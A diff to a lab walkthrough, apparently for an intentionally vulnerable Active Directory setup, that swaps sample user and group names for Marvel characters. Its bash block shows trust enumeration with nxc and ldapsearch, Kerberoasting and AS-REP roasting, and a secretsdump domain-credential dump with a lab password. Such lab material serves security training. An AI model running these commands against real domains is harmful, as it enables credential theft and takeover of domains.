@@ -8,13 +8,13 @@ Standard DC: 53, 88, 135, 137-139, 389, 445, 464, 636, 3268-3269, 3389, 5985, 93
 
 ## Users / groups / FSP
 
-- `fin_user1`, `fin_user2`
+- `scott.lang`, `hope.vandyne`
 - `fin_svc` SPN `HTTP/finance.local`
 - Group `Finance Admins`
 - **Foreign Security Principals (cross-forest):**
   - `CORP\Administrator` → `Domain Admins` (DF-009)
-  - `CORP\Administrator` → `IT Admins` (LAT-034)
-  - `CORP\helpdesk` → `Server Operators` (DF-038)
+  - `CORP\Administrator` → `Avengers Admins` (LAT-034)
+  - `CORP\nick.fury` → `Server Operators` (DF-038)
 
 ## Trust
 
@@ -25,10 +25,10 @@ External / forest trust from `corp.local` ↔ `finance.local`. Trust account pas
 ```bash
 F=10.20.0.10
 # From corp.local foothold:
-nxc ldap $F -u alice@corp.local -p 'DVADlab2024!' --trusted-domains
-ldapsearch -x -H ldap://$F -D 'corp\alice' -w 'DVADlab2024!' \
+nxc ldap $F -u peter.parker@corp.local -p 'DVADlab2024!' --trusted-domains
+ldapsearch -x -H ldap://$F -D 'corp\peter.parker' -w 'DVADlab2024!' \
     -b "DC=finance,DC=local" "(objectClass=foreignSecurityPrincipal)"
-nxc smb,ldap $F -u alice@corp.local -p 'DVADlab2024!' \
+nxc smb,ldap $F -u peter.parker@corp.local -p 'DVADlab2024!' \
     --kerberoasting fin_kerb.txt --asreproast fin_asrep.txt
 # Once you have CORP/Administrator NT hash:
 impacket-secretsdump -k -no-pass -just-dc \
